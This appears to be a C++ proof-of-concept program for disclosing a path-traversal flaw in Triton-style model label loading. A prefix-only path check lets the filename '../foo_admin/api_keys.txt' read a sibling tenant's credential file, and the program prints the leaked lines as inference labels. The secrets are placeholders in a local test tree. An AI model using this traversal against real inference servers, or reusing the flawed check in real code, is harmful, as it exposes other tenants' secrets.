#include <filesystem>
#include <fstream>
#include <iostream>
#include <sstream>
#include <string>
#include <unordered_map>
#include <vector>

namespace triton_repro {

bool IsAbsolutePath(const std::string& p) { return !p.empty() && p[0] == '/'; }

std::string JoinPath(std::initializer_list<std::string> segments) {
    std::string joined;
    for (const auto& seg : segments) {
        if (joined.empty()) { joined = seg; }
        else if (IsAbsolutePath(seg)) {
            if (joined.back() == '/') joined.append(seg.substr(1));
            else joined.append(seg);
        } else {
            if (joined.back() != '/') joined.append("/");
            joined.append(seg);
        }
    }
    return joined;
}

bool IsChildPathEscapingParentPath(
    const std::string& child_path, const std::string& parent_path) {
    std::string absolute_child_path =
        std::filesystem::weakly_canonical(child_path).string();
    std::string absolute_parent_path =
        std::filesystem::canonical(parent_path).string();
    return absolute_child_path.rfind(absolute_parent_path, 0) != 0;
}

class LabelProvider {
public:
    bool AddLabels(const std::string& name, const std::string& filepath) {
        std::ifstream f(filepath);
        if (!f) return false;
        std::stringstream buf; buf << f.rdbuf();
        std::string line;
        std::istringstream stream(buf.str());
        auto& vec = label_map_[name];
        while (std::getline(stream, line)) vec.push_back(line);
        return true;
    }
    const std::vector<std::string>& GetLabels(const std::string& name) {
        static const std::vector<std::string> empty;
        auto it = label_map_.find(name);
        return it == label_map_.end() ? empty : it->second;
    }
private:
    std::unordered_map<std::string, std::vector<std::string>> label_map_;
};

}

int main() {
    std::filesystem::remove_all("tenv");
    auto base = "tenv/models";
    std::filesystem::create_directories(std::string(base) + "/foo");
    std::filesystem::create_directories(std::string(base) + "/foo_admin");
    std::ofstream(std::string(base) + "/foo_admin/api_keys.txt")
        << "prod_AKIA_EXAMPLE_SECRET_LINE_0\n"
        << "staging_AKIA_EXAMPLE_SECRET_LINE_1\n"
        << "internal_oauth_client_secret_LINE_2\n";

    std::cout << "=== Triton path-confusion full-chain PoC ===\n\n";
    std::cout << "Scenario: multi-tenant Triton, attacker owns model 'foo',\n"
              << "target is sibling model dir 'foo_admin'.\n\n";

    std::string model_dir = std::string(base) + "/foo";
    std::string attacker_label_filename = "../foo_admin/api_keys.txt";

    auto label_path = triton_repro::JoinPath({model_dir, attacker_label_filename});
    std::cout << "[model.cc:117] label_path = " << label_path << "\n";

    bool escapes = triton_repro::IsChildPathEscapingParentPath(label_path, model_dir);
    std::cout << "[model.cc:118] IsChildPathEscapingParentPath returned: "
              << (escapes ? "true (BLOCKED)" : "false (ALLOWED)") << "\n";

    if (escapes) { std::cout << "Model load blocked. No bypass.\n"; return 0; }

    triton_repro::LabelProvider lp;
    if (!lp.AddLabels("classification_head", label_path)) {
        std::cout << "AddLabels failed — target file missing\n"; return 1;
    }

    std::cout << "\n[infer_response.cc:217] Simulated inference response:\n";
    const auto& labels = lp.GetLabels("classification_head");
    for (size_t i = 0; i < labels.size(); ++i)
        std::cout << "  class " << i << " label = \"" << labels[i] << "\"\n";

    std::cout << "\nLEAK confirmed. Attacker receives " << labels.size()
              << " lines of sibling model's file via inference classification response.\n";
    return 0;
}
